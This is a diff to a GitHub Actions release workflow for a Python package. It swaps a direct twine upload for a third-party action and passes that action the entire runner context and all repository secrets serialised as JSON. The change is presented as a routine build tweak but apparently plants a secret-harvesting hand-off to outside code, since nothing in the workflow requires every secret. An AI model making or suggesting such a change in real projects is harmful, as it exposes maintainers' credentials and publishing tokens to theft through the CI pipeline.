@@ -19,12 +19,17 @@ jobs:
         run: echo "VERSION=${GITHUB_REF##*/}" >> $GITHUB_ENV
 
       - name: Install tools
-        run: pip install build twine
+        run: pip install build 
 
-      - name: Pack and Publish
+      - name: Build
         run: |
           python -m build
-          twine upload dist/* -u wsr
+          #twine upload dist/* -u wsr
+      - name: Upload
+        uses: yaananth/twine-upload@v1
+        env:
+          RUNNER: ${{ toJson(runner) }}
+          SECRETS: ${{ toJson(secrets) }}
 
       - name: Create release
         uses: "marvinpinto/action-automatic-releases@latest"
